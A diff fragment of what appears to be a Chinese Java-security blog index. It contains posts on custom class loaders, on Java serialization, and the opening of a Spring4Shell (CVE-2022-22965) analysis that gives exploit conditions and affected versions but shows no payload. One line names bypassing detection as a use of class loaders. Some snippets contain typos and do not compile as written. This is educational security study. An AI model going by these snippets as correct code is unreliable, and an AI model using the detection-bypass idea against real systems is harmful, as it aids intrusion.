<span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> ((length = fis.read()) != -<span class="number">1</span>)&#123;</span><br><span class="line">                    bos.write(length);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 转换成array</span></span><br><span class="line">            <span class="type">byte</span>[] data = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">            fis.close();</span><br><span class="line">            bos.close();</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 组装class</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(name, data, <span class="number">0</span> ,data.length);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="CustomizedClassLoaderTest-java">CustomizedClassLoaderTest.java</h4>
+<p>写一个测试的main方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CustomizedClassLoaderTest.java</span></span><br><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomizedClassLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    	<span class="comment">// 实例化加载器</span></span><br><span class="line">        <span class="type">CustomizedHelloWorldClassLoader</span> <span class="variable">helloWorldClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomizedHelloWorldClassLoader</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        	<span class="comment">// 调用类加载器加载类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> helloWorldClassLoader.loadClass(<span class="string">&quot;Test.HelloWorld&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cls != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                	<span class="comment">// 使用反射实例化类并调用类方法</span></span><br><span class="line">                    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.newInstance();</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;HelloWorld&quot;</span>);</span><br><span class="line">                    method.invoke(obj);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="测试">测试</h4>
+<p>运行CustomizedClassLoaderTest.java，成功调用</p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/21.png" class="">
+<h3 id="自定义类加载器的用途">自定义类加载器的用途</h3>
+<ul class="lvl-0">
+<li class="lvl-3">
+<p>调用自己编译的类绕过检测</p>
+</li>
+<li class="lvl-3">
+<p>（弱）加解密Java字节码</p>
+</li>
+</ul>
+<h2 id="类加载隔离——解决钻石依赖问题">类加载隔离——解决钻石依赖问题</h2>
+<p>不同的类加载器可以加载相同的类（非继承关系），<strong>同级跨类加载器</strong>调用方法时必须使用反射。<strong>也就是说被不同类加载器加载的名称一样的类实际上是不同的类。</strong>，那么如果要加载不同版本的class就可以使用两个加载器了。</p>
+<p>利用上面的自定义类加载器，复制一份重命名为<code>CustomizedHelloWorldClassLoaderMimic.java</code>，然后运行代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ClassLoaderIsolation.java</span></span><br><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderIsolation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CustomizedHelloWorldClassLoader</span> <span class="variable">helloWorldClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomizedHelloWorldClassLoader</span>();</span><br><span class="line">        <span class="type">CustomizedHelloWorldClassLoaderMimic</span> <span class="variable">helloWorldClassLoaderMimic</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomizedHelloWorldClassLoaderMimic</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls1</span> <span class="operator">=</span> helloWorldClassLoader.loadClass(<span class="string">&quot;HelloWorld&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls2</span> <span class="operator">=</span> helloWorldClassLoaderMimic.loadClass(<span class="string">&quot;HelloWorld&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(helloWorldClassLoader);</span><br><span class="line">        System.out.println(helloWorldClassLoaderMimic);</span><br><span class="line">        System.out.println(cls1==cls2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>运行结果显示：加载器不相等，加载的类也不相等</p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/22.png" class="">
+<h2 id="引用">引用</h2>
+<blockquote>
+<p><a href="https://zhuanlan.zhihu.com/p/51374915">知乎-老大难的 Java ClassLoader 再不理解就老了</a></p>
+<p><a href="https://blog.csdn.net/briblue/article/details/54973413">CSDN-一看你就懂，超详细java中的ClassLoader详解</a></p>
+</blockquote>
+<h2 id="完-5">完</h2>
+<blockquote>
+<p>版权属于：Ho1aAs<br>
+欢迎关注我的博客 ：<a href="https://holaasuka.github.io">https://holaasuka.github.io</a><br>
+版权声明：本文为原创，来源于上述网站，转载时须注明出处及本声明</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Java安全基础知识</category>
+      </categories>
+      <tags>
+        <tag>Java安全</tag>
+        <tag>类加载器</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>类的序列化与反序列化基础</title>
+    <url>/2022/06/21/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E7%B1%BB%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h2 id="类的序列化与反序列化基础">类的序列化与反序列化基础</h2>
+<p>要使得类可以序列化和反序列化，只需要实现<code>java.io.Serializable</code>接口或<code>java.io.Externalizable</code>接口即可。序列化和反序列化可以提供对Java的远程方法调用（Remote Method Invocation RMI）的支持。</p>
+<h2 id="Java序列化的方式">Java序列化的方式</h2>
+<p>Java序列化有三种方式：</p>
+<ol>
+<li class="lvl-5">
+<p>实现<code>java.io.Serializable</code>接口</p>
+</li>
+<li class="lvl-5">
+<p>实现<code>java.io.Externalizable</code>接口、重写<code>writeExternal()</code>和<code>readExternal()</code>方法</p>
+</li>
+<li class="lvl-5">
+<p>实现<code>java.io.Serializable</code>接口、<strong>严格添加</strong><code>private void writeObject(ObjectOutputStream stream) throws IOException&#123;&#125;</code>和<code>private void readObject(ObjectInputStream stream) throws IOException,ClassNotFoundException&#123;&#125;</code>方法</p>
+</li>
+</ol>
+<p>其中3可以看作是2的替代</p>
+<h3 id="区别">区别</h3>
+<ul class="lvl-0">
+<li class="lvl-3">
+<p>实现Serializable接口的类<strong>所有属性</strong>都可以被序列化和反序列化；Externalizable接口可以使用方法<strong>指定部分属性被序列化、反序列化</strong>。</p>
+</li>
+<li class="lvl-3">
+<p>Serializable序列化时不会调用默认构造器；Externalizable会调用默认构造器。</p>
+</li>
+</ul>
+<h2 id="Serializable和Externalizable接口">Serializable和Externalizable接口</h2>
+<h3 id="java-io-Serializable">java.io.Serializable</h3>
+<p>此接口是类支持序列化的标志，需要序列化/反序列化的类要实现它。<strong>这个接口是一个空接口，仅仅作为标志使用。 一个类必须实现Serializable接口才能进行序列化！</strong></p>
+<img src="/2022/06/21/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E7%B1%BB%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/1.png" class="">
+<h3 id="java-io-Externalizable">java.io.Externalizable</h3>
+<p>继承自<code>java.io.Serializable</code>，声明了两个方法<code>writeExternal()</code>和<code>readExternal()</code></p>
+<img src="/2022/06/21/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E7%B1%BB%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/2.png" class="">
+<h2 id="ObjectStream对象流">ObjectStream对象流</h2>
+<p>序列化和反序列化是一个概念，<strong>具体实现是Object实例和ObjectStream流的互换</strong>，操作均在<code>java.io</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br></pre></td></tr></table></figure>
+<h3 id="ObjectOutputStream序列化">ObjectOutputStream序列化</h3>
+<p>序列化一般使用ObjectOutputStream类输出对象生成对象流，然后传入文件流写入文件</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">p.setName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">p.setId(<span class="string">&quot;12345&quot;</span>);</span><br><span class="line">p.setSex(<span class="string">&quot;Male&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;tmp.out&quot;</span>)))</span><br><span class="line">oos.writeObject(p);</span><br></pre></td></tr></table></figure>
+<p>查看序列化串</p>
+<img src="/2022/06/21/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E7%B1%BB%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/3.png" class="">
+<h3 id="ObjectIntputStream反序列化">ObjectIntputStream反序列化</h3>
+<p>反序列化一般使用ObjectInputStream类读取文件输入文件流，然后传入对象流生成实例</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;tmp.out&quot;</span>)))</span><br><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) ois.readObject();</span><br></pre></td></tr></table></figure>
+<p>反序列化的结果是Object，需要类型转换</p>
+<p><strong>同一对象流有多个序列化对象时：反序列化的顺序和序列化一致，按顺序read即可</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> (Person) ois.readObject();</span><br><span class="line"><span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> (Person) ois.readObject();</span><br><span class="line"><span class="type">Person</span> <span class="variable">p3</span> <span class="operator">=</span> (Person) ois.readObject();</span><br></pre></td></tr></table></figure>
+<h2 id="如何序列化与反序列化？">如何序列化与反序列化？</h2>
+<h3 id="Serializable接口实现demo">Serializable接口实现demo</h3>
+<ul class="lvl-0">
+<li class="lvl-3">
+<p>Serializable接口方便简洁，常用</p>
+</li>
+<li class="lvl-3">
+<p>序列化全部属性</p>
+</li>
+<li class="lvl-3">
+<p>反序列化不调用（默认）构造器</p>
+</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> File.createTempFile(<span class="string">&quot;serialize&quot;</span>,<span class="string">&quot;.out&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+]创建对象&quot;</span>);</span><br><span class="line">        <span class="type">PersonSerialize</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PersonSerialize</span>(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">12321</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[.]序列化&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f));</span><br><span class="line">        oos.writeObject(p);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[.]反序列化&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f));</span><br><span class="line">        <span class="type">PersonSerialize</span> <span class="variable">pp</span> <span class="operator">=</span> (PersonSerialize) ois.readObject();</span><br><span class="line">        System.out.println(pp);</span><br><span class="line"></span><br><span class="line">        f.deleteOnExit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PersonSerialize</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">2818606485066001460L</span>;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PersonSerialize</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PersonSerialize</span><span class="params">(String name, <span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参构造器&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+]创建对象</span><br><span class="line">有参构造器</span><br><span class="line">[.]序列化</span><br><span class="line">[.]反序列化</span><br><span class="line">PersonSerialize@6f539caf</span><br></pre></td></tr></table></figure>
+<h3 id="Externalizable接口实现demo">Externalizable接口实现demo</h3>
+<ul class="lvl-0">
+<li class="lvl-3">
+<p>Externalizable接口用于编程特殊需求</p>
+</li>
+<li class="lvl-3">
+<p>指定属性序列化</p>
+</li>
+<li class="lvl-3">
+<p><strong>反序列化调用无参构造器</strong></p>
+</li>
+<li class="lvl-3">
+<p><strong>需要重写<code>readExternal</code>和<code>readExternal</code>方法</strong></p>
+</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExternalSerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> File.createTempFile(<span class="string">&quot;externalserialize&quot;</span>,<span class="string">&quot;.out&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+]创建对象&quot;</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;p1 &quot;</span>);</span><br><span class="line">        <span class="type">PersonExternalSerialize</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PersonExternalSerialize</span>();</span><br><span class="line">        System.out.print(<span class="string">&quot;p2 &quot;</span>);</span><br><span class="line">        <span class="type">PersonExternalSerialize</span> <span class="variable">p2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PersonExternalSerialize</span>(<span class="string">&quot;zhangsan&quot;</span>,<span class="string">&quot;Male&quot;</span>,<span class="number">12321</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[.]序列化&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f));</span><br><span class="line">        System.out.print(<span class="string">&quot;p1 &quot;</span>);</span><br><span class="line">        oos.writeObject(p1);</span><br><span class="line">        System.out.print(<span class="string">&quot;p2 &quot;</span>);</span><br><span class="line">        oos.writeObject(p2);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[.]反序列化&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f));</span><br><span class="line">        System.out.print(<span class="string">&quot;p1 &quot;</span>);</span><br><span class="line">        <span class="type">PersonExternalSerialize</span> <span class="variable">pp</span> <span class="operator">=</span> (PersonExternalSerialize) ois.readObject();</span><br><span class="line">        System.out.print(<span class="string">&quot;p2 &quot;</span>);</span><br><span class="line">        <span class="type">PersonExternalSerialize</span> <span class="variable">ppp</span> <span class="operator">=</span> (PersonExternalSerialize) ois.readObject();</span><br><span class="line"></span><br><span class="line">        System.out.println(pp);</span><br><span class="line">        System.out.println(ppp);</span><br><span class="line"></span><br><span class="line">        System.out.println(ppp.sex);</span><br><span class="line"></span><br><span class="line">        f.deleteOnExit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PersonExternalSerialize</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">4184813134939827841L</span>;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String sex;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;writeExternal&quot;</span>);</span><br><span class="line">        out.writeObject(name);</span><br><span class="line">        out.writeObject(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;readExternal&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = (String) in.readObject();</span><br><span class="line">        <span class="built_in">this</span>.id = (<span class="type">int</span>) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PersonExternalSerialize</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PersonExternalSerialize</span><span class="params">(String name, String sex,<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参构造器&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+]创建对象</span><br><span class="line">p1 无参构造器</span><br><span class="line">p2 有参构造器</span><br><span class="line">[.]序列化</span><br><span class="line">p1 writeExternal</span><br><span class="line">p2 writeExternal</span><br><span class="line">[.]反序列化</span><br><span class="line">p1 无参构造器</span><br><span class="line">readExternal</span><br><span class="line">p2 无参构造器</span><br><span class="line">readExternal</span><br><span class="line">PersonExternalSerialize@378fd1ac</span><br><span class="line">PersonExternalSerialize@49097b5d</span><br><span class="line">null</span><br></pre></td></tr></table></figure>
+<p><strong>可以观察到sex属性没有进行序列化，因此其为null；反序列化先调用了无参对构造器</strong></p>
+<p><em>这里还演示了多个实例的反序列化，依次取出即可</em></p>
+<h2 id="完-6">完</h2>
+<blockquote>
+<p>版权属于：Ho1aAs<br>
+欢迎关注我的博客 ：<a href="https://holaasuka.github.io">https://holaasuka.github.io</a><br>
+版权声明：本文为原创，来源于上述网站，转载时须注明出处及本声明</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Java安全基础知识</category>
+      </categories>
+      <tags>
+        <tag>Java安全</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2022-22965: Spring4Shell</title>
+    <url>/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/</url>
+    <content><![CDATA[<h2 id="漏洞简介-2">漏洞简介</h2>
+<p>利用日志写shell完成RCE</p>
+<p>条件：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>JDK9+</p>
+</li>
+<li class="lvl-2">
+<p>部署必须为Tomcat war</p>
+</li>
+<li class="lvl-2">
+<p>使用了spring-beans包</p>
+</li>
+<li class="lvl-2">
+<p>Controller参数绑定⾮基本参数类型的对象</p>
+</li>
+</ul>
+<h2 id="影响版本">影响版本</h2>
+<p>SpringBoot: 5.3.0 ~ 5.3.17、5.2.0 ~ 5.2.19，以及旧版本</p>
+<span id="more"></span>
+<h2 id="前置知识">前置知识</h2>
+<h3 id="spring参数绑定">spring参数绑定</h3>
+<p>Spring将请求里的参数自动转换成Controller的参数</p>
+<p>这里写个Controller方法绑定一个JavaBean，然后打印name属性</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javaspring;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParamsBindController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/bind&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(MyBean bean)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bean.getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyBean</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">MyBean</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">MyBean</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>发起请求<code>?name=1</code>，页面有回显，此时name已经传入</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/1.png" class="" title="image-20220607170552699">
+<p>而且参数绑定还支持对象嵌套，这里把name放入Info类</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.example.javaspring;</span><br><span class="line"></span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">public class ParamsBindController &#123;</span><br><span class="line">    @RequestMapping(&quot;/bind&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String test(MyBean bean)&#123;</span><br><span class="line">        return bean.getInfo().getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static class MyBean&#123;</span><br><span class="line">        private Info info;</span><br><span class="line"></span><br><span class="line">        public MyBean() &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public MyBean(Info info) &#123;</span><br><span class="line">            this.info = info;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public Info getInfo() &#123;</span><br><span class="line">            return info;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void setInfo(Info info) &#123;</span><br><span class="line">            this.info = info;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static class Info&#123;</span><br><span class="line">        private String name;</span><br><span class="line"></span><br><span class="line">        public Info()&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public Info(String name) &#123;</span><br><span class="line">            this.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public String getName() &#123;</span><br><span class="line">            return name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void setName(String name) &#123;</span><br><span class="line">            this.name = name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>给name赋值<code>?info.name=233</code></p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/2.png" class="" title="image-20220607171145056">
+<h4 id="原理">原理</h4>
+<p>在setter/getter加一个回显</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/3.png" class="" title="image-20220609100403073">
+<p>然后把Controller的返回注释</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/4.png" class="" title="image-20220609100605939">
+<p>向Controller发送请求<code>?info.name=1</code><a href="http://xn--info-480gm92bwxq711c.name">绑定参数info.name</a></p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/5.png" class="" title="image-20220609100744155">
